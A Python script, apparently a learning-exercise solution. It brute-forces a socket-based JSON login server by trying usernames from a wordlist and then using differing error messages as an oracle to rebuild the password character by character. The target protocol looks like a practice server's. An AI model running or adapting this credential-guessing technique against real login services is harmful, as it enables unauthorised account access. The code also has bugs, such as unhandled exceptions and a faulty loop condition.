import argparse
import socket
import json
import string

all_chars = string.ascii_letters + string.digits + string.punctuation


def return_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port')
    args = parser.parse_args()
    return args


def create_socket(ip, port):
    client_socket = socket.socket()
    client_socket.connect((ip, port))
    return client_socket


def read_file(path):
    with open(path, 'r') as file:
        for row in file:
            yield row


def find_login(client_socket, chunk_size):
        for login in read_file('logins.txt'):
            login = login.strip('\n')
            json_login = {'login': login, 'password': ''}
            message = json.dumps(json_login, indent=4)
            try:
                client_socket.send(message.encode('utf-8'))
                response = client_socket.recv(chunk_size).decode('utf-8')
            except:
                pass
            returned_str = json.loads(response)
            if returned_str['result'] == 'Wrong password!':
                return json_login['login']



def find_password(client_socket, chunk_size,  correct_login):
    char_list = list(all_chars)
    for single_char in char_list:
        json_login = {'login': correct_login, 'password': single_char}
        message = json.dumps(json_login, indent=4)
        try:
            client_socket.send(message.encode('utf-8'))
            response = client_socket.recv(chunk_size).decode('utf-8')
        except:
            pass
        returned_str = json.loads(response)
        if returned_str['result'] == 'Exception happened during login':
            guessed_password = json_login['password']
            char_index = 0
            while response != 'Connection success!':
                password = guessed_password
                password += char_list[char_index]
                char_index += 1
                json_login['password'] = password
                message = json.dumps(json_login, indent=4)
                try:
                    client_socket.send(message.encode('utf-8'))
                    response = client_socket.recv(chunk_size).decode('utf-8')
                except:
                    pass
                returned_str = json.loads(response)
                if returned_str['result'] == 'Exception happened during login':
                    guessed_password = password
                    char_index = 0
                elif returned_str['result'] == 'Connection success!':
                    return json_login
                    break
    return json_login